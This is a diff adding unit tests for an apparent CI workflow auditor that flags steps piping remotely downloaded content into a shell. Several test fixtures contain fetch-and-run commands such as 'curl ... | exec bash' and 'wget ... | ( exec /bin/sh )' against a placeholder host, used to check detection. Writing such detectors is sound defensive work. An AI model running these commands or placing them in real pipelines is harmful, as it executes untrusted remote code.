@@ -342,6 +342,49 @@ class RatchetTests(unittest.TestCase):
         )
         self.assertEqual(mod.audit(self.repo, legacy, self.commit()).new_risky_workflows, 1)
 
+    def test_exec_builtin_shell_consumes_remote_stdin(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/i | exec bash\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_exec_shell_inside_pipeline_subshell_is_remote_execution(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: wget -qO- https://example.invalid/i | ( exec /bin/sh )\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_downloaded_script_exec_builtin_consumer_rejected(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -o local.sh https://example.invalid/i && exec bash local.sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_exec_builtin_read_only_json_filter_is_not_remote_code(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/i | exec jq .\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_exec_builtin_legacy_workflow_requires_changes_for_new_debt(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/i | exec bash\n"
+        )
+        old = self.commit()
+        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
+        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/i | exec bash\n"
+            "      - run: echo changed\n"
+        )
+        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
+
     def test_timeout_wrapped_interpreter_pipe_rejected(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/i | timeout 30 bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
